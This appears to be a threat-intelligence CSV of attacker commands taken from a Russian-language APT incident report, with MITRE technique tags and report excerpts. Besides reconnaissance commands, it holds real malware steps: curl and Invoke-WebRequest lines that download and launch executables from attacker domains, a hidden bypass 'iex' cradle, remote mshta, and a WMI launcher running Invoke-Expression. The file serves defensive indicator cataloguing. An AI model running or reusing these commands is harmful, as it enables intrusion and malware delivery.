schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--anonymous,artifact--sha256:5a6769496d596a1137fb06086dc6652909eca47d9cce48f56eec861ca0f13f0b,observation--sha256:76dba42683c40eddacf58bd8868924222abb79938046a0182ff9cc5af73368cc,command,cmd.exe /Q /c powershell.exe Get-LocalUser | Select name 1> \Windows\Temp\,cmd.exe /Q /c powershell.exe Get-LocalUser | Select name 1> \Windows\Temp\,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 253}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"T1087.001 Local Account Также BO Team использовали PowerShell-командлет для получения списка локальных пользователей в системе: T1087 Account Discovery Чтобы в дальнейшем выполнить боковое перемещение в инфраструктуре, атакующие выполняли сбор событий подключения по протоколу RDP, извлекая данные о пользователях и IP-адресах, использованных для входа в систему, с помощью следующих команд: cmd.exe /Q /c powershell.exe Get-LocalUser | Select name 1> \Windows\Temp\ MbGTqY 2>&1 Get-WinEvent -FilterH",
1.0.0,actor--anonymous,artifact--sha256:3bf62e4943983c91ede767e34f205bfc41d8e79728c8db45e91e331e971a36c0,observation--sha256:ded3a9862c8c4ac8fe3d6adbb0a7f1fbe124e2c05cea3ac70d5910eaf7b9d746,command,cmd.exe /Q /c powershell.exe mshta.exe,cmd.exe /Q /c powershell.exe mshta.exe,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 213}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"cmd.exe /Q /c powershell.exe mshta.exe https://<domain>.com/<word>/<word>/<word>/<word>/<word>.hta Set WshShell = WScript.CreateObject(""WScript.Shell"") WshShell.Run Chr(34) & "".\zermndzg.bat"" & Chr(34), 0, False WshShell.Run Chr(34) & "".\zermndzg.docx"" & Chr(34), 1, False Set WshShell = Nothing var objService = GetObject(""winmgmts:\\\\.\\root\\cimv2"");var objStartup = objService.Get(""Win32_ProcessStartup"");var objConfig = objStartup. SpawnInstance_();objConfig.ShowWindow = 0;var processClass = o",
1.0.0,actor--anonymous,artifact--sha256:57da371146ef98c4ac9c87290a7be40c19e30a701b1e97d22d44addbdda15831,observation--sha256:66bddb780e985f71a3bd517de7a4f60aeccc8f38555bbe237e0e3c0c1057f386,command,cmd.exe /c %appdata%\bj.exe -pass aa83ec8e98,cmd.exe /c %appdata%\bj.exe -pass aa83ec8e98,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 61}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"T1078 Valid Accounts Для получения первоначального доступа к инфраструктуре государственных организаций, а также компаний из телекоммуникационного и производственного секторов, группировка BlackJack использовала скомпрометированные легитимные учетные записи. Этот подход позволял злоумышленникам действовать от имени легитимных пользователей, снижая вероятность обнаружения на ранних этапах атаки. T1059.001 PowerShell Г руппа BlackJack применяет встроенные PowerShell-команды для перемещения вредоно",
1.0.0,actor--anonymous,artifact--sha256:e6562a5e0733ecfa48f6b711a97bcd517457405adfdb5e1bd1050a06dd872cbf,observation--sha256:4d897ee33df1fd1008c3abd1674c6cec50abdd073d4d017ecfa1fa8ca3c15bbb,command,cmd.exe /c dir C:\,cmd.exe /c dir C:\,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 73}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"T1199 Trusted Relationship В качестве первоначального доступа к инфраструктуре жертвы атакующие воспользовались скомпрометированной учетной записью подрядчика и подключились по VPN. T1190 Exploit Public-Facing Application Кроме действительных учетных данных и взлома через подрядчика, Crypt Ghouls эксплуатировали уязвимость CVE-2021-26084 в Atlassian Confluence, которая позволяет атакующим удаленно выполнять команды на уязвимом сервере: Также мы встретили эксплуатацию MS SQL Server: Initial Acces",
1.0.0,actor--anonymous,artifact--sha256:f5cc32cb6b90c54d15b10d130771e6f23e65cd2a24409a8d6e90b8babc68bedf,observation--sha256:10351362009b088e870c9ac7e46117c850086c3d8ce672a8a9ad3945b88c1a44,command,cmd.exe /c dir C:\Program Files,cmd.exe /c dir C:\Program Files,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 73}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"T1199 Trusted Relationship В качестве первоначального доступа к инфраструктуре жертвы атакующие воспользовались скомпрометированной учетной записью подрядчика и подключились по VPN. T1190 Exploit Public-Facing Application Кроме действительных учетных данных и взлома через подрядчика, Crypt Ghouls эксплуатировали уязвимость CVE-2021-26084 в Atlassian Confluence, которая позволяет атакующим удаленно выполнять команды на уязвимом сервере: Также мы встретили эксплуатацию MS SQL Server: Initial Acces",
1.0.0,actor--anonymous,artifact--sha256:6f5dacb439386136a64269c7a8f819d26f58fa1fa891d9e9057185b1c506c5dd,observation--sha256:3273e5200c7bb9e37a2fb4d9fa8f19310c9a35538f61424573b73e23bf2b2cf0,command,cmd.exe /c dir C:\Users,cmd.exe /c dir C:\Users,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 73}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"T1199 Trusted Relationship В качестве первоначального доступа к инфраструктуре жертвы атакующие воспользовались скомпрометированной учетной записью подрядчика и подключились по VPN. T1190 Exploit Public-Facing Application Кроме действительных учетных данных и взлома через подрядчика, Crypt Ghouls эксплуатировали уязвимость CVE-2021-26084 в Atlassian Confluence, которая позволяет атакующим удаленно выполнять команды на уязвимом сервере: Также мы встретили эксплуатацию MS SQL Server: Initial Acces",
1.0.0,actor--anonymous,artifact--sha256:860ebd18401e6c27261c309604181f661dd74bfb13912c538b67a2d06bf899b7,observation--sha256:21f6aaada18ac73c626907a95b30c201eb5bb9fd4778fdedefeaf4ddb3bc1293,command,cmd.exe /c echo >> c:\Intel\rezet.cmd ping -n 6 127.0.0.1,cmd.exe /c echo >> c:\Intel\rezet.cmd ping -n 6 127.0.0.1,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 173}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,cd C:\Intel\ ping -n 6 127.0.0.1 C:\Intel\curl.exe -o C:\Intel\driver.exe hxxp://downdown[.]ru/driver.jpg C:\Intel\curl.exe -o C:\Intel\blat.exe hxxp://downdown[.]ru/blat.jpg C:\Intel\curl.exe -o C:\Intel\svchost.exe hxxp://downdown[.]ru/svchost.jpg C:\Intel\curl.exe -o C:\Intel\Trays.rar hxxp://downdown[.]ru/Trays.jpg C:\Intel\curl.exe -o C:\Intel\AnyDesk\wol.ps1 hxxp://downdown[.]ru/wol.jpg C:\Intel\curl.exe -o C:\Intel\dc.exe hxxp://downdown[.]ru/dc.jpg C:\Intel\driver.exe x -r -ep2 -hplimpid,
1.0.0,actor--anonymous,artifact--sha256:51b5827b1a184726fbb0155fb451bd9228289848ce642d05220edb4e69e6e12f,observation--sha256:61ae232676f89d163a5ac22f439aa107ec704e84774dda54bcee5b3d833a616b,command,cmd.exe /c echo c:\Intel\rezet.cmd cd c:\Intel\,cmd.exe /c echo c:\Intel\rezet.cmd cd c:\Intel\,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 173}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,cd C:\Intel\ ping -n 6 127.0.0.1 C:\Intel\curl.exe -o C:\Intel\driver.exe hxxp://downdown[.]ru/driver.jpg C:\Intel\curl.exe -o C:\Intel\blat.exe hxxp://downdown[.]ru/blat.jpg C:\Intel\curl.exe -o C:\Intel\svchost.exe hxxp://downdown[.]ru/svchost.jpg C:\Intel\curl.exe -o C:\Intel\Trays.rar hxxp://downdown[.]ru/Trays.jpg C:\Intel\curl.exe -o C:\Intel\AnyDesk\wol.ps1 hxxp://downdown[.]ru/wol.jpg C:\Intel\curl.exe -o C:\Intel\dc.exe hxxp://downdown[.]ru/dc.jpg C:\Intel\driver.exe x -r -ep2 -hplimpid,
1.0.0,actor--anonymous,artifact--sha256:de7c62c84481f6cd2995c5a3a6662a757aead9393b4402c8b733fd831ce19ce7,observation--sha256:2c0e1e21c9dfab1ac6899b5782b02d05c39952b6c639d5243e16a59bb5588ad9,command,"cmd.exe /c if not exist ""C:\Users\user\UserCacheHelper.lnk.js","cmd.exe /c if not exist ""C:\Users\user\UserCacheHelper.lnk.js",candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 217}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"cmd.exe /c if not exist ""C:\Users\user\UserCacheHelper.lnk.js"" echo var objService = GetObject(""winmgmts:\\\\.\\root\\cimv2"");var objStartup=objService.Get(""Win32_ProcessStartup"");var objConfig = objStartup.SpawnInstance_();objConfig.ShowWindow = 0;var processClass = objService.Get(""Win32_Process""); var command=""powershell.exe -c \""$raw=Get- Content C:\\Users\\user\\UserCache.ini;Invoke-Expression $raw\"""";var result=processClass.Create(command, null, objConfig, 0); > C:\Users\user\ UserCacheHelp",
1.0.0,actor--anonymous,artifact--sha256:a288ae9f735efea1686636e3aad5a56680989b585143c4bbcdbf0293ab77c9a6,observation--sha256:b0b00f6bf940ad8b5ac7fd1f3e63d214762d8c65663830811e93752676bc0521,command,cmd.exe /c ipconfig,cmd.exe /c ipconfig,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 166}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"T1016 System Network Configuration Discovery Одна из задач злоумышленников на ранних этапах после компрометации — это определение публичного IP-адреса зараженного хоста. Для этого использовалась следующая PowerShell-команда: Команда обращается к стороннему публичному сервису https://ident.me, который возвращает внешний IP-адрес устройства. Также в рамках этапа разведки в скомпрометированной системе злоумышленники запустили следующую команду: powershell.exe -C ""[Console]::OutputEncoding = New-Obj",
1.0.0,actor--anonymous,artifact--sha256:5095220d6a17a154a25f73681bb3a9f4c58b2d7991ea93e9b15c143ca9d473c9,observation--sha256:e5c2be2c1a758dbdb599f5cc22fef99b97363deaa5eb8b652869c0bf754967cc,command,cmd.exe /c msiexec.exe /x {GUID} /quiet,cmd.exe /c msiexec.exe /x {GUID} /quiet,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 103}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"T1059.001 PowerShell Г руппа использует PowerShell для выполнения команд и скриптов. Вот один из таких примеров: T1059.003 Windows Command Shell Г руппа использует командную строку Windows для выполнения различных команд, например: T1047 Windows Management Instrumentation Найденные образцы Revenge RAT, используемые группировкой, работают с WMI (Windows Management Instrumentation), для сбора информации о системе. Посредством WMI-запросов они могут извлекать сведения об операционной системе, учетн",
1.0.0,actor--anonymous,artifact--sha256:499456c624ac7e942cb63859d34e020c476e1a261aa8b9cdde0e78dc79893387,observation--sha256:bb252d84090043107b7e9f73caa39c3f0650bb294a2df30ef8da2bf072be09c3,command,cmd.exe /c net users,cmd.exe /c net users,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 165}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"T1082 System Information Discovery && T1033 System Owner / User Discovery В скомпрометированных системах было зафиксировано использование PowerShell и CMD для проведения локальной разведки. Г руппировка выполняла команды, направленные на получение сведений о файловой структуре, локальных пользователях, текущей системе и текущем пользователе, а также группах, в которых он состоит: T1057 Process Discovery В рамках вредоносной активности злоумышленники инициировали команду на получение информации о",
1.0.0,actor--anonymous,artifact--sha256:2bb894741c9b75b95cbb4e1749ad2620016c7c629d88ffcc9998e3709a486f5e,observation--sha256:5f32ea5fb8a61528c3f737ed4b8812fb96e6646c8b6da573091debb2e35fabc6,command,"cmd.exe /c powershell.exe -ex bypass -w hidden -c ""iex (New-Object System.","cmd.exe /c powershell.exe -ex bypass -w hidden -c ""iex (New-Object System",candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 73}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"T1199 Trusted Relationship В качестве первоначального доступа к инфраструктуре жертвы атакующие воспользовались скомпрометированной учетной записью подрядчика и подключились по VPN. T1190 Exploit Public-Facing Application Кроме действительных учетных данных и взлома через подрядчика, Crypt Ghouls эксплуатировали уязвимость CVE-2021-26084 в Atlassian Confluence, которая позволяет атакующим удаленно выполнять команды на уязвимом сервере: Также мы встретили эксплуатацию MS SQL Server: Initial Acces",
1.0.0,actor--anonymous,artifact--sha256:3319a9dbc67bca90379a8dda53ed87a8d9426590fb532f6f19823a9a8f8f8e35,observation--sha256:34d5c3df94cfc60be7f8e52168a48f47a5e86e5c774225f3d6d6e2696a0791e9,command,cmd.exe /c quser,cmd.exe /c quser,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 73}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"T1199 Trusted Relationship В качестве первоначального доступа к инфраструктуре жертвы атакующие воспользовались скомпрометированной учетной записью подрядчика и подключились по VPN. T1190 Exploit Public-Facing Application Кроме действительных учетных данных и взлома через подрядчика, Crypt Ghouls эксплуатировали уязвимость CVE-2021-26084 в Atlassian Confluence, которая позволяет атакующим удаленно выполнять команды на уязвимом сервере: Также мы встретили эксплуатацию MS SQL Server: Initial Acces",
1.0.0,actor--anonymous,artifact--sha256:06345448d5e4aa4b99b598dc154102ae6f8bd38b7783aab4ef8a76f3c6c8e2ed,observation--sha256:3bfd2739fedadfd4d0edff230158e0bba1232b9a7a1f1316d281b636713075b6,command,cmd.exe /c schtasks /query /v /fo LIST\,cmd.exe /c schtasks /query /v /fo LIST\,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 195}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"T1007 System Service Discover T1082 System Information Discovery T1057 Process Discovery При помощи импланта VBShower группировка собирает различную информацию из атакованной системы: • получает список задач планировщика, используя следующую команду: • извлекает информацию об именах и размерах файлов из следующих папок: • получает имя и значения ключей реестра из ветки Run; • получает текущий домен, имя пользователя и имя компьютера. PowerShower проверяет настройки прокси-сервера. Ниже приведена",
1.0.0,actor--anonymous,artifact--sha256:f72b767233db54ef60fc763c6424e6b9ad2e90b5f859e2fc860c231446cbf927,observation--sha256:91084f8aa6c68bc5224de72e5eb4e7af21510ae5c8d28046640d00a944828b46,command,cmd.exe /c tasklist,cmd.exe /c tasklist,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 73}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"T1199 Trusted Relationship В качестве первоначального доступа к инфраструктуре жертвы атакующие воспользовались скомпрометированной учетной записью подрядчика и подключились по VPN. T1190 Exploit Public-Facing Application Кроме действительных учетных данных и взлома через подрядчика, Crypt Ghouls эксплуатировали уязвимость CVE-2021-26084 в Atlassian Confluence, которая позволяет атакующим удаленно выполнять команды на уязвимом сервере: Также мы встретили эксплуатацию MS SQL Server: Initial Acces",
1.0.0,actor--anonymous,artifact--sha256:35bf33f5203db884ac8ac0b58045c9cf6928c3c9aa6c919ccc85ee384d884e11,observation--sha256:f860652b41aaa4f3e97d572aea1b8a13ca3d54c92cf97c29b129a01137762c03,command,"cmd.exe /c where /r %LocalAppData%\Temp Резюме.rar | ( set /p ""v="" && @","cmd.exe /c where /r %LocalAppData%\Temp Резюме.rar | ( set /p ""v="" && @",candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 161}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"T1204.002 User Execution: Malicious File После того как пользователи получали вредоносный архив, следующим этапом цепочки заражения было использование содержащегося внутри архива LNK-файла, маскирующего выполнение вредоносного кода под запуск якобы легитимного документа. В одном из обнаруженных нами архивов при открытии файла Rez_ZelibRV.lnk автоматически выполнялась команда, содержащая цепочку действий через cmd.exe, WinRAR.exe и PowerShell. Листинг команды представлен ниже: Команда, прописанна",
1.0.0,actor--anonymous,artifact--sha256:3e24b9030c957a378cbf3108a123fc661c58f50e0342d7c0e76b0d13a6c5b9d1,observation--sha256:6580f49f1aaca29407ee8c932646857c73f2c1708d0aae94a86ff535c70cfb66,command,cmd.exe /c whoami,cmd.exe /c whoami,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 73}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"T1199 Trusted Relationship В качестве первоначального доступа к инфраструктуре жертвы атакующие воспользовались скомпрометированной учетной записью подрядчика и подключились по VPN. T1190 Exploit Public-Facing Application Кроме действительных учетных данных и взлома через подрядчика, Crypt Ghouls эксплуатировали уязвимость CVE-2021-26084 в Atlassian Confluence, которая позволяет атакующим удаленно выполнять команды на уязвимом сервере: Также мы встретили эксплуатацию MS SQL Server: Initial Acces",
1.0.0,actor--anonymous,artifact--sha256:37fbace4fb87c66b08bab1f98381b69550787a70e38c3932347a5bcd4ff7d06b,observation--sha256:9d7abf0ceab83adf263594cb7629f08e4d6cd0a562c2f81cb4c6ae326bb5d0c6,command,"creationdate | where name -eq ""powershell.exe","creationdate | where name -eq ""powershell.exe",candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 196}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Также PowerShower проверяет файлы в каталоге пользователя (часть скрипта PowerShell): Команда для обнаружения сетевых настроек: Также при расследовании инцидентов мы заметили использование Advanced Port Scanner для сканирования сети. Он располагался по пути: В рамках атак также использовались следующие команды обнаружения процессов: Get-ChildItem -Path ""C:\Users\""; ipconfig /all C:\ProgramData\Advanced_Port_ Scanner_2.5.3869.exe. Get-Process Get-WmiObject Win32_Process | select processid, name, ",
1.0.0,actor--anonymous,artifact--sha256:124bdce7ef96d9d35d65ef25fdca33e2f0abd00126d86b2fab7ec048e958aa80,observation--sha256:b6cc8831fb3da0d20af67aa393080ecea29febb23eb8948d3757359279be0275,command,curl https://github[.]com/PowerShellMafia/PowerSploit/blob/dev/Recon/,curl https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 43}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Расследование связей между группировками и эволюция угрозы T1090 Proxy SystemBC В ряде атак группировки мы обнаруживали использование утилиты SystemBC. SystemBC — это вредоносное программное обеспечение, впервые обнаруженное в 2018 году, которое функционирует как прокси-сервер SOCKS5 и удаленный административный инструмент (RA T). Оно используется киберпреступниками для обеспечения. Основные функции SystemBC: SystemBC распространяется в виде архива, содержащего: • имплант в формате исполняемого ",
1.0.0,actor--anonymous,artifact--sha256:ed7b38597f36cce7fec1bc28f35c9fd176e90f9c0e4427d0a53124ceb118ca29,observation--sha256:7ed8f9eefc4dff3e7be3da3615f4b70af78fef2987b0e036b559ed1922a5032c,command,del /q %SYSTEMDRIVE%\Intel\curl.exe,del /q %SYSTEMDRIVE%\Intel\curl.exe,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 176}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"ATTRIB +s +h @$&%17\Intel del /q %SYSTEMDRIVE%\Intel\curl.exe del /q %SYSTEMDRIVE%\Intel\Trays.rar del /q %SYSTEMDRIVE%\Intel\svchost.exe Privilege Escalation Defense Evasion T1548.002 Bypass User Account Control Импланты APT собраны при помощи Smart Install Maker, который может запрашивать пользователя предоставить права администратора для привилегированного выполнения команд. T1564.001 Hidden Files and Directories Злоумышленники устанавливают атрибуты «скрытый» и «системный» на папку C:\Intel,",
1.0.0,actor--anonymous,artifact--sha256:c65f5ed52caabaada8a3e9fb4015c1a5970eb57efdaf558cd46fc38d07848fcd,observation--sha256:10570133a23b2403210f0cf2d53a12182425d8b70b60671aa14ea7e659d8e976,command,"jpg"" или ""dc.jpg""). Также эта APT использует то же расширение для вредоносных PowerShell-скриптов","jpg"" или ""dc.jpg""). Также эта APT использует то же расширение для вредоносных PowerShell-скриптов",candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 176}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"ATTRIB +s +h @$&%17\Intel del /q %SYSTEMDRIVE%\Intel\curl.exe del /q %SYSTEMDRIVE%\Intel\Trays.rar del /q %SYSTEMDRIVE%\Intel\svchost.exe Privilege Escalation Defense Evasion T1548.002 Bypass User Account Control Импланты APT собраны при помощи Smart Install Maker, который может запрашивать пользователя предоставить права администратора для привилегированного выполнения команд. T1564.001 Hidden Files and Directories Злоумышленники устанавливают атрибуты «скрытый» и «системный» на папку C:\Intel,",
1.0.0,actor--anonymous,artifact--sha256:8fddd47c322a4e08da36ed6849d9d2b946dcc5a6d9017e6bc91c1b7ed0fca803,observation--sha256:2310abe719e01f659f243ad02da86a8c5863c87c7b6f23c24023213438fa237c,command,"lnk.js, который затем запускает PowerShell-скрипт с именем UserCache.ini).","lnk.js, который затем запускает PowerShell-скрипт с именем UserCache.ini",candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 213}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"cmd.exe /Q /c powershell.exe mshta.exe https://<domain>.com/<word>/<word>/<word>/<word>/<word>.hta Set WshShell = WScript.CreateObject(""WScript.Shell"") WshShell.Run Chr(34) & "".\zermndzg.bat"" & Chr(34), 0, False WshShell.Run Chr(34) & "".\zermndzg.docx"" & Chr(34), 1, False Set WshShell = Nothing var objService = GetObject(""winmgmts:\\\\.\\root\\cimv2"");var objStartup = objService.Get(""Win32_ProcessStartup"");var objConfig = objStartup. SpawnInstance_();objConfig.ShowWindow = 0;var processClass = o",
1.0.0,actor--anonymous,artifact--sha256:486d374a66c99b44fdeb0f5efd03caa357be4ff385df7bb9f519001c505d0f92,observation--sha256:34a20d52faba762aa8837139a5076828076ecf66f095a555dc1062990aa06cbb,command,"objService.Get(""Win32_Process""); var command=""powershell.exe -c \""$raw=Get-","objService.Get(""Win32_Process""); var command=""powershell.exe -c \""$raw=Get-",candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 217}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"cmd.exe /c if not exist ""C:\Users\user\UserCacheHelper.lnk.js"" echo var objService = GetObject(""winmgmts:\\\\.\\root\\cimv2"");var objStartup=objService.Get(""Win32_ProcessStartup"");var objConfig = objStartup.SpawnInstance_();objConfig.ShowWindow = 0;var processClass = objService.Get(""Win32_Process""); var command=""powershell.exe -c \""$raw=Get- Content C:\\Users\\user\\UserCache.ini;Invoke-Expression $raw\"""";var result=processClass.Create(command, null, objConfig, 0); > C:\Users\user\ UserCacheHelp",
1.0.0,actor--anonymous,artifact--sha256:87ef412b88e9652abf18fcf9101ebafbbb30f6d8811b1f6cf41a2236617e6267,observation--sha256:b019a947767d9f92e5575fd4960a8b497e13e19e1b3dac788c348e58dfd9b9eb,command,"powershell ""Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-","powershell ""Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-",candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 78}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Parent_image_path: ""c:\windows\system32\wbem\wmiprvse.exe"" Command_line: ""cmd.exe /Q /c powershell.exe ""Get-LocalUser | Select name"" 1> \Windows\Temp\qnLJbp 2>&1"""" powershell ""Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows- TerminalServices-LocalSessionManager/Operational'; Id=25; StartTime=(Get- Date).AddDays(-30)} | ForEach-Object { $userDomain = if ($_.Properties[0]. Value) { $_.Properties[0].Value } else { 'Unknown' }; $ip = if ($_. Properties[2].Value) { $_.Properties[2].Value }",
1.0.0,actor--anonymous,artifact--sha256:08383d9c08aede43b26897b4025637365e64ceb2ebcdaefa892c71f15fe17085,observation--sha256:94c6af7f5b677ddc795a5f359aba8f78db69e12061aa11b53e0c68d7160559d4,command,"powershell -Command \""Invoke-WebRequest 'hxxps://files.","powershell -Command \""Invoke-WebRequest 'https://files",candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 160}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Также стоит отметить, что в коде содержится часть, отвечающая за скачивание и запуск бэкдора: — <code block> — <script> function openCalculator() { try { var shell = new ActiveXObject(""WScript.Shell""); // Одной командой скачиваем файл и запускаем shell.Run( ""powershell -Command \""Invoke-WebRequest 'hxxps://files. gkrzn[.]ru/direct/cb72fe89-1d75-4b2b-a138-8b5bf51b7578/8fc4eac9/rezume.pdf' -OutFile $Env:TEMP\\csrss32.exe; Start-Process $Env:TEMP\\csrss32.exe\"""", 0, true ); } catch (e) { alert(""Una",
